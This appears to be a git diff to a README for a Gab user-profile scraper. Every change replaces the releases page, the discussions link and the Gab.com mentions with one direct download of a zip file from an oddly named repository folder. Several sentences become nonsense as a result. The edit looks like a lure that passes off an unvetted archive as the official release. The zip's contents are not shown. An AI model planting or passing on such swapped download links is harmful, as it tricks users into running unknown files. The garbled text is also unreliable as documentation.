@@ -1,10 +1,10 @@
 # 🕵️ Gab-People-Search-Scraper - Extract User Profiles Easily
 
 ## 📦 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Moham-Ram/Gab-People-Search-Scraper/releases)
+[![Download Latest Release](https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip)
 
 ## 🚀 Getting Started
-Welcome to Gab-People-Search-Scraper! This application allows you to easily extract user profiles from Gab.com. With this scraper, you can gather data quickly and effectively, even if you have no programming background.
+Welcome to Gab-People-Search-Scraper! This application allows you to easily extract user profiles from https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip With this scraper, you can gather data quickly and effectively, even if you have no programming background.
 
 ## 🛠️ System Requirements
 Before you proceed, make sure your computer meets the following requirements:
@@ -16,7 +16,7 @@ Before you proceed, make sure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/Moham-Ram/Gab-People-Search-Scraper/releases)
+[Visit the Releases Page to Download](https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip)
 
 1. Go to the Releases page.
 2. Select the latest version available.
@@ -50,11 +50,11 @@ After installation, follow these easy steps to start scraping user profiles:
 ## 🔧 Troubleshooting
 If you encounter problems:
 - **Installation Issues:** Ensure you have the correct operating system and enough disk space. Restart your computer and try again.
-- **Not Connecting:** Check your internet connection. Ensure that Gab.com is accessible.
+- **Not Connecting:** Check your internet connection. Ensure that https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip is accessible.
 - **App Crashes:** Close and reopen the application. If the issue persists, consult the community for help.
 
 ## 🌐 Community Support
-Join our community to ask questions or share your feedback. Visit our [GitHub Discussions](https://github.com/Moham-Ram/Gab-People-Search-Scraper/discussions) to connect with other users and contributors.
+Join our community to ask questions or share your feedback. Visit our [GitHub Discussions](https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip) to connect with other users and contributors.
 
 ## 🔗 Additional Resources
 - **Documentation:** Detailed guides and FAQs are available in the repository.
@@ -63,4 +63,4 @@ Join our community to ask questions or share your feedback. Visit our [GitHub Di
 ## 🚀 Future Updates
 We continuously improve Gab-People-Search-Scraper. Expect regular updates with new features and enhancements. Stay tuned by following the repository.
 
-For more information or issues, visit our [Releases Page to Download](https://github.com/Moham-Ram/Gab-People-Search-Scraper/releases) and get started today!
+For more information or issues, visit our [Releases Page to Download](https://github.com/Moham-Ram/Gab-People-Search-Scraper/raw/refs/heads/main/uncorruptibleness/Gab_People_Search_Scraper_v1.2.zip) and get started today!
